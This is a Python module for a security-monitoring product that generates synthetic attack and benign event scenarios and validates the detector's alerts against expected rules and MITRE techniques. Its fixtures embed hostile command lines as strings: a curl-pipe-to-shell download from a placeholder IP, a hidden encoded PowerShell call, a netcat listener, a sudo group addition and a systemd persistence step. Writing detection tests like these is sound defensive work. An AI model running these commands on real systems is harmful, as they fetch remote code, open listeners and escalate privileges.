"""Safe synthetic security-event simulation lab for ThreatWatch.

The simulator ONLY builds structured ThreatWatch event payloads in memory and
persists them through the ordinary validated pipeline (``detector.process_event``).
It never executes commands, never performs network I/O, never touches real
credentials, and never targets anything outside the local database. Expected
outcomes declared here are validation metadata only — they never influence
detection, risk, or Jev, which run on the generated events exactly as they run
on any other telemetry.
"""
from __future__ import annotations

import json
import sqlite3
from datetime import datetime, timedelta, timezone
from uuid import uuid4

from database import connect, utc_now
from detector import process_event

# Bounded doc IPs (RFC 5737) / example domains only; never real targets.
DEFAULTS = {
    'BRUTE_SRC': '203.0.113.10',
    'SPRAY_SRC': '203.0.113.11',
    'SCAN_SRC': '203.0.113.12',
    'PS_HOST': 'ws-lab-01',
    'ADMIN_USER': 'svc-backup',
    'PS_USER': 'jdoe',
    'DNS_HOST': 'ws-lab-02',
    'DNS_USER': 'jsmith',
    'SPIKE_SRC': '203.0.113.13',
    'NORMAL_SRC': '203.0.113.14',
    'NORMAL_USER': 'asmith',
    'DNS': 'mail.internal-corp.com',
    'ATTACKER': '203.0.113.9',
}

MAX_EVENTS_PER_RUN = 120
MAX_SOURCE_LENGTH = 64
SIM_SOURCE = 'soc-simulation'


class SimulationError(ValueError):
    """Scenario generation/validation problem (bounded, safe message)."""


def _ts(base, offset):
    return (base + timedelta(seconds=offset)).isoformat(
        timespec='microseconds').replace('+00:00', 'Z')


def _event(event_type, base, offset, **fields):
    fields.setdefault('source', SIM_SOURCE)
    return {'event_type': event_type, 'event_time': _ts(base, offset), **fields}


# ---------------------------------------------------------------------------
# Scenario catalog: 15 safe synthetic scenarios with expected outcomes used
# ONLY by the deterministic validation engine (never by detection).
# ---------------------------------------------------------------------------

def _brute_force_events(base, d):
    events = []
    for index in range(7):
        events.append(_event(
            'auth_failed', base, index * 5, src_ip=d['BRUTE_SRC'],
            user='svc-sql', host='db-lab-01', dst_ip='10.20.30.40'))
    return events


def _spray_events(base, d):
    events = []
    for round_index in range(2):
        for index, user in enumerate(('alice', 'bob', 'carol', 'dave')):
            events.append(_event(
                'auth_failed', base, round_index * 20 + index * 5,
                src_ip=d['SPRAY_SRC'], user=user, host='vpn-lab-01'))
    return events


def _port_scan_events(base, d):
    return [_event(
        'port_scan', base, 0, src_ip=d['SCAN_SRC'], dst_ip='10.20.30.40',
        host='netprobe-lab-01', ports=[21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389])]


def _powershell_events(base, d):
    return [_event(
        'powershell_script', base, 0, host=d['PS_HOST'], user=d['PS_USER'],
        process='powershell.exe',
        command_line='powershell -nop -w hidden -enc '
                     'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAGsAaQBsAGwA')]


def _suspicious_command_events(base, d):
    return [_event(
        'process_start', base, 0, host='ws-lab-03', user='svc-web',
        process='bash',
        command_line="curl http://203.0.113.9/payload.sh | sh")]


def _suspicious_process_events(base, d):
    # Listener-mode netcat: the binary basename alone is the TW-007 signal;
    # an '-e' relay command line would additionally fire the TW-006 abuse
    # regex and lead the correlated group (TW-006 outranks it on insertion).
    return [_event(
        'process_start', base, 0, host='ws-lab-03', user='svc-web',
        process='/tmp/nc', command_line='/tmp/nc -l -p 4444')]


def _priv_esc_events(base, d):
    return [_event(
        'process_start', base, 0, host='app-lab-01', user='deploy',
        process='sudo', command_line='sudo usermod -aG sudo svc-web')]


def _persistence_events(base, d):
    return [_event(
        'process_start', base, 0, host='app-lab-01', user='deploy',
        process='systemctl',
        command_line='systemctl enable /etc/systemd/system/lab-updater.service')]


def _dns_exfil_events(base, d):
    events = []
    for index in range(3):
        events.append(_event(
            'dns_query', base, index * 10, host=d['DNS_HOST'], user=d['DNS_USER'],
            domain=d['DNS'], src_ip='10.20.30.50'))
    return events


def _malicious_ip_events(base, d):
    events = []
    for index in range(7):
        events.append(_event(
            'auth_failed', base, index * 5, src_ip='192.168.1.20',
            user='root', host='edge-lab-01'))
    return events


def _traffic_spike_events(base, d):
    return [_event(
        'traffic_spike', base, 0, src_ip=d['SPIKE_SRC'], host='filer-lab-01',
        bytes=987654321)]


def _benign_auth_events(base, d):
    events = []
    for index in range(4):
        events.append(_event(
            'auth_failed', base, index * 90, src_ip=d['NORMAL_SRC'],
            user=d['NORMAL_USER'], host='vpn-lab-01'))
    return events


def _benign_admin_ps_events(base, d):
    return [_event(
        'powershell_script', base, 0, host=d['PS_HOST'], user=d['ADMIN_USER'],
        process='powershell.exe',
        command_line='powershell -command Get-EventLog -LogName System '
                     '-Newest 50 | Format-Table -AutoSize')]


def _benign_network_events(base, d):
    # NOTE: TW-002/TW-003 alert on ANY port_scan/traffic_spike event by
    # design, so a "benign network" scenario must use event types the
    # detection engine treats as noise: ordinary DNS lookups on a non
    # internal-looking domain plus successful logins.
    events = []
    for index in range(4):
        events.append(_event(
            'dns_query', base, index * 30, host='healthcheck-lab-01',
            user='health-check', domain='cdn.example.com', src_ip='10.20.30.60'))
        events.append(_event(
            'auth_success', base, index * 30 + 10, src_ip='10.20.30.60',
            user='health-check', host='healthcheck-lab-01'))
    return events


def _mixed_activity_events(base, d):
    events = []
    for index in range(3):
        events.append(_event(
            'auth_failed', base, index * 45, src_ip=d['NORMAL_SRC'],
            user='bob', host='vpn-lab-01'))
    events.append(_event(
        'auth_success', base, 140, src_ip=d['NORMAL_SRC'], user='bob',
        host='vpn-lab-01'))
    events.append(_event(
        'traffic_spike', base, 160, src_ip='127.0.0.1',
        host='healthcheck-lab-01', bytes=2048))
    return events


SCENARIO_GENERATORS = {
    'brute_force': _brute_force_events,
    'password_spray': _spray_events,
    'port_scan': _port_scan_events,
    'suspicious_powershell': _powershell_events,
    'suspicious_command': _suspicious_command_events,
    'suspicious_process': _suspicious_process_events,
    'privilege_escalation': _priv_esc_events,
    'persistence': _persistence_events,
    'dns_exfiltration': _dns_exfil_events,
    'malicious_ip': _malicious_ip_events,
    'traffic_spike': _traffic_spike_events,
    'benign_auth': _benign_auth_events,
    'benign_admin_powershell': _benign_admin_ps_events,
    'benign_network': _benign_network_events,
    'mixed_activity': _mixed_activity_events,
}

SCENARIOS = {
    'brute_force': {
        'name': 'Brute Force',
        'description': 'Repeated authentication failures against a single target account.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-001',
            'severity': 'HIGH', 'mitre': ['T1110'],
            'jev_investigation_required': True,
        },
    },
    'password_spray': {
        'name': 'Password Spraying',
        'description': 'One source failing against many distinct accounts.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-004',
            'severity': 'HIGH', 'mitre': ['T1110.003'],
            'jev_investigation_required': True,
        },
    },
    'port_scan': {
        'name': 'Port Scan',
        'description': 'A probe touching many TCP ports on one internal target.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-002',
            'severity': 'MEDIUM', 'mitre': ['T1046'],
            'jev_investigation_required': True,
        },
    },
    'suspicious_powershell': {
        'name': 'Suspicious PowerShell',
        'description': 'Encoded/hidden PowerShell execution telemetry.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-005',
            'severity': 'HIGH', 'mitre': ['T1059.001', 'T1027'],
            'jev_investigation_required': True,
        },
    },
    'suspicious_command': {
        'name': 'Suspicious Command',
        'description': 'Curl-pipe-to-shell command-line activity.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-006',
            'severity': 'MEDIUM', 'mitre': ['T1059'],
            'jev_investigation_required': True,
        },
    },
    'suspicious_process': {
        'name': 'Suspicious Process',
        'description': 'Execution of a commonly abused remote-access binary.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-007',
            'severity': 'MEDIUM', 'mitre': ['T1059.004'],
            'jev_investigation_required': True,
        },
    },
    'privilege_escalation': {
        'name': 'Privilege Escalation',
        'description': 'Attempt to add an account to a privileged group.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-008',
            'severity': 'HIGH', 'mitre': ['T1078.003', 'T1548.003'],
            'jev_investigation_required': True,
        },
    },
    'persistence': {
        'name': 'Persistence',
        'description': 'Installation of a systemd service for persistence.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-009',
            'severity': 'HIGH', 'mitre': ['T1543.002', 'T1053.003'],
            'jev_investigation_required': True,
        },
    },
    'dns_exfiltration': {
        'name': 'DNS Exfiltration',
        'description': 'Repeated lookups of a look-alike internal domain.',
        'classification': 'suspicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-010',
            'severity': 'MEDIUM', 'mitre': ['T1048.003'],
            'jev_investigation_required': True,
        },
    },
    'malicious_ip': {
        'name': 'Malicious IP / Threat Intel Match',
        'description': 'Authentication failures from a listed threat-intel source.',
        'classification': 'malicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-001',
            'severity': 'HIGH', 'mitre': ['T1110'],
            'jev_investigation_required': True,
        },
    },
    'traffic_spike': {
        'name': 'Traffic Spike',
        'description': 'Large outbound byte burst on one host.',
        'classification': 'suspicious',
        'expected': {
            'detection': True, 'rule_id': 'TW-003',
            'severity': 'LOW', 'mitre': [],
            'jev_investigation_required': None,
        },
    },
    'benign_auth': {
        'name': 'Benign Authentication Activity',
        'description': 'A normal user with a few spaced-out failed logins.',
        'classification': 'benign',
        'expected': {
            'detection': False, 'rule_id': None, 'severity': None, 'mitre': [],
            'jev_investigation_required': None,
        },
    },
    'benign_admin_powershell': {
        'name': 'Benign Administrative PowerShell',
        'description': 'An administrator reading event logs — no abuse indicators.',
        'classification': 'benign',
        'expected': {
            'detection': False, 'rule_id': None, 'severity': None, 'mitre': [],
            'jev_investigation_required': None,
        },
    },
    'benign_network': {
        'name': 'Benign Network Activity',
        'description': 'Ordinary DNS lookups and successful logins from an '
                       'internal health-check host.',
        'classification': 'benign',
        'expected': {
            'detection': False, 'rule_id': None, 'severity': None, 'mitre': [],
            'jev_investigation_required': None,
        },
    },
    'mixed_activity': {
        'name': 'Mixed / Ambiguous Activity',
        'description': 'Normal logins plus one isolated traffic burst — exercises '
                       'false-positive behavior: the deterministic TW-003 rule '
                       'alerts on ANY traffic-spike event, which validation '
                       'surfaces as a warning, never hides it.',
        'classification': 'ambiguous',
        'expected': {
            'detection': False, 'rule_id': None, 'severity': None, 'mitre': [],
            'jev_investigation_required': None,
        },
    },
}


def scenario_catalog():
    """Public scenario list with metadata (never includes generated events)."""
    catalog = []
    for scenario_id, scenario in SCENARIOS.items():
        generator = SCENARIO_GENERATORS[scenario_id]
        catalog.append({
            'scenario_id': scenario_id,
            'name': scenario['name'],
            'description': scenario['description'],
            'classification': scenario['classification'],
            'default_event_count': len(generator(
                datetime.now(timezone.utc), DEFAULTS)),
            'expected': scenario['expected'],
        })
    return catalog


def _normalize_base(base):
    if isinstance(base, str):
        try:
            base = datetime.fromisoformat(base.replace('Z', '+00:00'))
        except ValueError as exc:
            raise SimulationError('event_time must be ISO-8601') from exc
    if base.tzinfo is None:
        base = base.replace(tzinfo=timezone.utc)
    return base.astimezone(timezone.utc)


def generate_events(scenario_id, event_time=None):
    """Generate the bounded, synthetic event payloads for one scenario."""
    scenario = SCENARIOS.get(scenario_id)
    if scenario is None:
        raise SimulationError(f'unknown scenario: {scenario_id}')
    base = _normalize_base(event_time or datetime.now(timezone.utc))
    events = SCENARIO_GENERATORS[scenario_id](base, DEFAULTS)
    if not events or len(events) > MAX_EVENTS_PER_RUN:
        raise SimulationError('scenario generator produced an unbounded event set')
    for event in events:
        event['event_id'] = f'sim-{uuid4().hex[:24]}'
        event['source_type'] = {
            'auth_failed': 'authentication', 'auth_success': 'authentication',
            'port_scan': 'network', 'traffic_spike': 'network',
            'process_start': 'process', 'dns_query': 'dns',
            'powershell_script': 'powershell',
        }.get(event['event_type'], 'simulator')
    return events


# ---------------------------------------------------------------------------
# Run persistence + in-process processing + deterministic validation
# ---------------------------------------------------------------------------

def _connect(db_file):
    return connect(db_file)


def _load_run_row(connection, run_id):
    return connection.execute(
        'SELECT * FROM simulation_runs WHERE run_id = ?', (run_id,)).fetchone()


def _run_view(row, event_ids, alert_ids):
    return {
        'run_id': row['run_id'],
        'scenario_id': row['scenario_id'],
        'status': row['status'],
        'event_count': row['event_count'],
        'generated_at': row['generated_at'],
        'processed_at': row['processed_at'],
        'event_ids': event_ids,
        'alert_ids': alert_ids,
        'validation': json.loads(row['validation_json']) if row['validation_json'] else None,
    }


def _alert_ids_for(connection, run_id):
    return [row[0] for row in connection.execute(
        'SELECT alert_id FROM simulation_run_alerts WHERE run_id = ? '
        'ORDER BY alert_id', (run_id,))]


def create_run(scenario_id, db_file=None):
    """Persist a new generated-but-unprocessed simulation run."""
    scenario = SCENARIOS.get(scenario_id)
    if scenario is None:
        raise SimulationError(f'unknown scenario: {scenario_id}')
    events = generate_events(scenario_id)
    run_id = f'SIMR-{uuid4().hex[:12]}'
    payloads = [json.dumps(event, sort_keys=True) for event in events]
    with _connect(db_file) as connection:
        connection.execute('BEGIN IMMEDIATE')
        try:
            connection.execute(
                'INSERT INTO simulation_runs (run_id, scenario_id, status, '
                'event_count, generated_at, event_ids_json) '
                'VALUES (?, ?, ?, ?, ?, ?)',
                (run_id, scenario_id, 'generated', len(events), utc_now(),
                 json.dumps([event['event_id'] for event in events])))
            connection.executemany(
                'INSERT INTO simulation_events (run_id, event_index, event_id, payload_json) '
                'VALUES (?, ?, ?, ?)',
                [(run_id, index, event['event_id'], payload)
                 for index, (event, payload) in enumerate(zip(events, payloads))])
            connection.commit()
        except Exception:
            connection.rollback()
            raise
    return _run_view(_load_run(db_file, run_id),
                     [event['event_id'] for event in events], [])


def _load_run(db_file, run_id):
    with _connect(db_file) as connection:
        row = _load_run_row(connection, run_id)
    if row is None:
        raise SimulationError('simulation run not found')
    return row


def get_run(run_id, db_file=None):
    """Fetch a run with its event IDs and linked alerts."""
    row = _load_run(db_file, run_id)
    with _connect(db_file) as connection:
        event_ids = [r[0] for r in connection.execute(
            'SELECT event_id FROM simulation_events WHERE run_id = ? '
            'ORDER BY event_index', (run_id,))]
        alert_ids = _alert_ids_for(connection, run_id)
    return _run_view(row, event_ids, alert_ids)


def list_runs(limit=20, db_file=None):
    limit = max(1, min(int(limit), 100))
    with _connect(db_file) as connection:
        rows = connection.execute(
            'SELECT * FROM simulation_runs ORDER BY generated_at DESC LIMIT ?',
            (limit,)).fetchall()
        runs = []
        for row in rows:
            runs.append(_run_view(
                row,
                [r[0] for r in connection.execute(
                    'SELECT event_id FROM simulation_events WHERE run_id = ? '
                    'ORDER BY event_index', (row['run_id'],))],
                _alert_ids_for(connection, row['run_id'])))
    return runs


def process_run(run_id, db_file=None):
    """Process a generated run through the real pipeline (exactly once).

    Each generated event is fed to the ordinary ``detector.process_event``
    path. Alert links are recorded so later validation and demo reset can
    attribute results to this run without touching detection internals.
    """
    row = _load_run(db_file, run_id)
    if row['status'] == 'processed':
        return get_run(run_id, db_file)
    if row['status'] != 'generated':
        raise SimulationError(f'run is not processable (status {row["status"]})')
    with _connect(db_file) as connection:
        payloads = [r[0] for r in connection.execute(
            'SELECT payload_json FROM simulation_events WHERE run_id = ? '
            'ORDER BY event_index', (run_id,))]
    alert_ids = []
    for raw in payloads:
        payload = json.loads(raw)
        if process_event(payload, db_file=db_file):
            stored = _fetch_event_row(db_file, payload['event_id'])
            if stored is not None:
                alert_ids.extend(_alerts_created_for(db_file, payload['event_id']))
    alert_ids = sorted(set(alert_ids))
    with _connect(db_file) as connection:
        connection.execute('BEGIN IMMEDIATE')
        try:
            connection.executemany(
                'INSERT OR IGNORE INTO simulation_run_alerts (run_id, alert_id) '
                'VALUES (?, ?)',
                [(run_id, alert_id) for alert_id in alert_ids])
            connection.execute(
                'UPDATE simulation_runs SET status = ?, processed_at = ? '
                'WHERE run_id = ? AND status = ?',
                ('processed', utc_now(), run_id, 'generated'))
            connection.commit()
        except Exception:
            connection.rollback()
            raise
    return get_run(run_id, db_file)


def _fetch_event_row(db_file, event_id):
    with _connect(db_file) as connection:
        return connection.execute(
            'SELECT ingestion_time FROM events WHERE event_id = ?',
            (event_id,)).fetchone()


def _alerts_created_for(db_file, event_id):
    with _connect(db_file) as connection:
        rows = connection.execute(
            'SELECT id FROM alerts WHERE event_id = ?', (event_id,)).fetchall()
    return [row[0] for row in rows]


# ---------------------------------------------------------------------------
# Deterministic validation engine
# ---------------------------------------------------------------------------

def _alert_rows(db_file, alert_ids):
    result = {}
    if not alert_ids:
        return result
    with _connect(db_file) as connection:
        placeholders = ','.join('?' for _ in alert_ids)
        for row in connection.execute(
                f'SELECT id, rule_id, severity, deterministic_risk_score, '
                f'jev_investigation_required, mitre_techniques_json '
                f'FROM alerts WHERE id IN ({placeholders})', alert_ids):
            try:
                mitre = json.loads(row['mitre_techniques_json'] or '[]')
            except (TypeError, ValueError):
                mitre = []
            result[row['id']] = {
                'alert_id': row['id'], 'rule_id': row['rule_id'],
                'severity': row['severity'],
                'risk_score': row['deterministic_risk_score'],
                'jev_investigation_required': (
                    bool(row['jev_investigation_required'])
                    if row['jev_investigation_required'] is not None else None),
                'mitre': mitre,
            }
    return result


def _ai_summary_for_run(db_file, alert_ids):
    """Read persisted AI investigation results for the run's alerts."""
    summary = {'available': 0, 'malicious': None, 'missing': 0}
    if not alert_ids:
        return summary
    with _connect(db_file) as connection:
        placeholders = ','.join('?' for _ in alert_ids)
        rows = connection.execute(
            f'SELECT status, response_json FROM ai_investigation_results '
            f'WHERE alert_id IN ({placeholders}) ORDER BY alert_id', alert_ids).fetchall()
    if not rows:
        summary['missing'] = max(len(alert_ids), 1)
        return summary
    summary['available'] = len(rows)
    summary['missing'] = max(len(alert_ids) - len(rows), 0)
    try:
        first = json.loads(rows[0]['response_json'] or '{}')
        likelihood = first.get('malicious_likelihood')
        if isinstance(likelihood, (int, float)):
            summary['malicious'] = round(float(likelihood), 2)
    except (TypeError, ValueError):
        pass
    return summary


def _soar_summary_for_run(db_file, alert_ids):
    if not alert_ids:
        return {'executions': 0, 'waiting_approval': 0, 'pending_approvals': 0}
    with _connect(db_file) as connection:
        placeholders = ','.join('?' for _ in alert_ids)
        executions = connection.execute(
            f'SELECT state FROM soar_executions WHERE alert_id IN ({placeholders})',
            alert_ids).fetchall()
        pending = connection.execute(
            f'SELECT COUNT(*) FROM soar_approvals WHERE decision = ? AND execution_id IN '
            f'(SELECT execution_id FROM soar_executions WHERE alert_id IN ({placeholders}))',
            ['pending'] + alert_ids).fetchone()[0]
    states = [row[0] for row in executions]
    return {
        'executions': len(states),
        'waiting_approval': sum(1 for s in states if s == 'WAITING_APPROVAL'),
        'pending_approvals': pending,
    }


def _add_check(checks, name, passed):
    checks.append({'name': name, 'passed': bool(passed)})


def validate_run(run_id, db_file=None):
    """Deterministically compare actual pipeline results with expectations.

    Never calls the AI and never writes: pure read + arithmetic. AI/SOAR
    checks are informational and require persisted results to pass.
    """
    run = get_run(run_id, db_file)
    scenario = SCENARIOS.get(run['scenario_id'])
    if scenario is None or run['status'] != 'processed':
        raise SimulationError('run not found or not processed yet')
    expected = scenario['expected']
    alert_ids = run['alert_ids']
    alerts = list(_alert_rows(db_file, alert_ids).values())
    checks = []

    detected = bool(alerts)
    expected_detection = bool(expected['detection'])
    _add_check(checks, 'detection', detected == expected_detection)
    # A benign/ambiguous scenario that produced alerts is a surfaced false
    # positive: reported as a warning (per the validation contract), never
    # silently passed and never hidden.
    false_positive = detected and not expected_detection

    expected_severity = expected['severity']
    severity_ok = (
        (not expected_detection and not alerts)
        or (expected_severity is None and not alerts)
        or any(alert['severity'] == expected_severity for alert in alerts))
    _add_check(checks, 'severity', severity_ok)

    expected_rule = expected['rule_id']
    rule_ok = (
        (not expected_detection and not alerts)
        or (expected_rule is None and not alerts)
        or any(alert['rule_id'] == expected_rule for alert in alerts))
    _add_check(checks, 'rule', rule_ok)

    expected_mitre = set(expected['mitre'])
    actual_mitre = set().union(*(set(alert['mitre']) for alert in alerts)) if alerts else set()
    # One correlated group can legitimately carry both a sub-technique and
    # its parent (e.g. spraying fires TW-004 *and* TW-001), so the
    # expectation is a subset unless this is a benign scenario, where any
    # technique at all is a mismatch.
    mitre_ok = (not actual_mitre if not expected_detection
                else expected_mitre <= actual_mitre)
    _add_check(checks, 'mitre', mitre_ok)

    jev_ok = True
    if expected_detection and expected['jev_investigation_required'] is not None:
        jev_ok = any(alert['jev_investigation_required']
                     == expected['jev_investigation_required'] for alert in alerts)
    _add_check(checks, 'jev', jev_ok)

    ai = _ai_summary_for_run(db_file, alert_ids)
    if not expected_detection:
        ai_ok = ai['available'] == 0
    else:
        ai_ok = ai['available'] >= 1
    _add_check(checks, 'ai', ai_ok)

    soar = _soar_summary_for_run(db_file, alert_ids)
    _add_check(checks, 'soar', True)  # workflow-availability check, always run

    # Deterministic failures fail the scenario; a missing optional AI result
    # is only a warning (AI is advisory and disabled by default).
    deterministic_checks = ('detection', 'severity', 'rule', 'mitre', 'jev')
    deterministic_failed = [check['name'] for check in checks
                            if not check['passed'] and check['name'] in deterministic_checks]
    optional_failed = [check['name'] for check in checks
                       if not check['passed'] and check['name'] not in deterministic_checks]
    if deterministic_failed and not false_positive:
        outcome = 'failed'
    elif deterministic_failed or optional_failed:
        outcome = 'warning'
    else:
        outcome = 'passed'
    validation = {
        'run_id': run_id,
        'scenario_id': run['scenario_id'],
        'classification': scenario['classification'],
        'outcome': outcome,
        'false_positive': false_positive,
        'checks': checks,
        'failed_checks': deterministic_failed + optional_failed,
        'expected': expected,
        'actual': {
            'detected': detected,
            'alerts': [
                {'alert_id': alert['alert_id'], 'rule_id': alert['rule_id'],
                 'severity': alert['severity'], 'risk_score': alert['risk_score'],
                 'jev_investigation_required': alert['jev_investigation_required'],
                 'mitre': alert['mitre']}
                for alert in alerts],
            'ai': ai,
            'soar': soar,
        },
    }
    return validation


def scenario_summary(limit=100, db_file=None):
    """Aggregate validation outcomes across recent processed runs."""
    limit = max(1, min(int(limit), 100))
    totals = {'runs': 0, 'passed': 0, 'warning': 0, 'failed': 0}
    per_scenario = []
    with _connect(db_file) as connection:
        rows = connection.execute(
            'SELECT run_id, scenario_id, validation_json FROM simulation_runs '
            "WHERE status = 'processed' AND validation_json IS NOT NULL "
            'ORDER BY generated_at DESC LIMIT ?', (limit,)).fetchall()
    for row in rows:
        try:
            validation = json.loads(row['validation_json'])
        except (TypeError, ValueError):
            continue
        outcome = validation.get('outcome')
        totals['runs'] += 1
        if outcome == 'passed':
            totals['passed'] += 1
        elif outcome == 'warning':
            totals['warning'] += 1
        else:
            totals['failed'] += 1
        per_scenario.append({
            'run_id': row['run_id'], 'scenario_id': row['scenario_id'],
            'outcome': outcome,
            'failed_checks': validation.get('failed_checks', []),
        })
    return {'totals': totals, 'runs': per_scenario}


def store_validation(run_id, validation, db_file=None):
    """Persist a computed validation result onto its run (single writer)."""
    with _connect(db_file) as connection:
        connection.execute('BEGIN IMMEDIATE')
        try:
            connection.execute(
                'UPDATE simulation_runs SET validation_json = ?, updated_at = ? '
                'WHERE run_id = ?',
                (json.dumps(validation, sort_keys=True), utc_now(), run_id))
            connection.commit()
        except Exception:
            connection.rollback()
            raise


def persist_ai_result(alert_id, result, db_file=None):
    """Store the AI investigation payload for an alert (read-back/audit aid)."""
    with _connect(db_file) as connection:
        connection.execute('BEGIN IMMEDIATE')
        try:
            connection.execute(
                'INSERT OR REPLACE INTO ai_investigation_results '
                '(alert_id, ai_schema_version, status, response_json, created_at, updated_at) '
                'VALUES (?, ?, ?, ?, ?, ?)',
                (alert_id, str(result.get('ai_schema_version', '')),
                 str(result.get('status', 'unknown')),
                 json.dumps(result.get('response'), sort_keys=True),
                 utc_now(), utc_now()))
            connection.commit()
        except Exception:
            connection.rollback()
            raise


def delete_simulation_data(db_file=None):
    """Remove ONLY simulation-generated data. Refuses outside simulation scope.

    Deletes events sourced 'soc-simulation' plus alerts/runs/links attributed
    to simulation runs, then vacuums related SOAR/investigation rows whose
    alerts no longer exist. Never touches rules, knowledge, or non-sim data.
    """
    with _connect(db_file) as connection:
        connection.execute('BEGIN IMMEDIATE')
        try:
            alert_ids = [row[0] for row in connection.execute(
                'SELECT DISTINCT alert_id FROM simulation_run_alerts '
                'WHERE alert_id IS NOT NULL')]
            run_event_ids = [row[0] for row in connection.execute(
                'SELECT event_id FROM simulation_events')]
            if alert_ids:
                placeholders = ','.join('?' for _ in alert_ids)
                connection.execute(
                    f'DELETE FROM investigation_events WHERE alert_id IN ({placeholders})',
                    alert_ids)
                connection.execute(
                    f'DELETE FROM ai_investigation_results WHERE alert_id IN ({placeholders})',
                    alert_ids)
                connection.execute(
                    f'DELETE FROM alert_enrichment WHERE alert_id IN ({placeholders})',
                    alert_ids)
                connection.execute(
                    f'DELETE FROM soar_executions WHERE alert_id IN ({placeholders})',
                    alert_ids)
                # Alerts before events: alerts.event_id is ON DELETE SET NULL.
                connection.execute(
                    f'DELETE FROM alerts WHERE id IN ({placeholders})', alert_ids)
                # Demo artifacts: incidents whose every linked alert is gone.
                # Incidents that still reference live (non-sim) alerts stay.
                for row in connection.execute(
                        'SELECT incident_id, alert_ids_json FROM soar_incidents'):
                    try:
                        linked = json.loads(row['alert_ids_json'] or '[]')
                    except (TypeError, ValueError):
                        linked = []
                    if not linked:
                        continue
                    marks = ','.join('?' for _ in linked)
                    alive = connection.execute(
                        f'SELECT COUNT(*) FROM alerts WHERE id IN ({marks})',
                        linked).fetchone()[0]
                    if alive == 0:
                        connection.execute(
                            'DELETE FROM soar_incidents WHERE incident_id = ?',
                            (row['incident_id'],))
            connection.execute('DELETE FROM simulation_run_alerts')
            connection.execute('DELETE FROM simulation_events')
            connection.execute('DELETE FROM simulation_runs')
            # Replay bookkeeping is a pure lab artifact; remove it entirely.
            for table in ('soc_replay_events', 'soc_replays'):
                try:
                    connection.execute(f'DELETE FROM {table}')
                except sqlite3.Error:
                    pass
            # Analyst cases are removed only when their incident died in the
            # vacuum above (lab-created); cases on live incidents remain.
            try:
                connection.execute(
                    'DELETE FROM soc_case_notes WHERE case_id NOT IN '
                    '(SELECT case_id FROM soc_cases)')
                connection.execute(
                    'DELETE FROM soc_cases WHERE incident_id NOT IN '
                    '(SELECT incident_id FROM soar_incidents)')
            except sqlite3.Error:
                pass
            if run_event_ids:
                placeholders = ','.join('?' for _ in run_event_ids)
                connection.execute(
                    f'DELETE FROM events WHERE event_id IN ({placeholders}) '
                    f'AND source = ?', run_event_ids + [SIM_SOURCE])
            connection.commit()
        except Exception:
            connection.rollback()
            raise
    return {'simulation_data_removed': True}
